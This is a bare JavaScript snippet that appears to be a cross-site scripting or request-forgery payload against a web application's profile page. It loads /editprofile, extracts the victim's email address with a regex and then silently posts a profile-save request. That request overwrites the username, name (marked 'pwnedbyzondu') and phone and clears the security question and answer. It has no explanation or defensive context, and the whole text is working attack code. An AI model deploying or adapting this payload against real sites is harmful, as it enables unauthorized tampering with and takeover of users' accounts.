    var url = "/editprofile";
    var xhr = new XMLHttpRequest();
    xhr.responseType = 'text';
        xhr.open("GET", url, true);
        xhr.onload = function (e) {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    
                var text = xhr.responseText;
                var email = text.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.+(?!png)+[a-zA-Z0-9._-]+)/gi);
                
                console.log(email)
                
                var xhr2 = new XMLHttpRequest();
                xhr2.open("POST", "/site/profile.do?&ajax=true&dispatch=save", true);     
                xhr2.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded; charset=UTF-8');
                xhr2.send('userName=gtc2*'+email+'&isUniqueEmailEnabled=true&isEmailAsUsername=false&oldEmailId='+email+'&passMinLength=6&firstName=pwnedbyzondu&lastName=testa&email='+email+'&emailAlerts=on&timezone=PST&hidePublicProfile=on&securityQuestion=&securityAnswer=&phone=34534535');
                
            }
        };
        xhr.send(null);
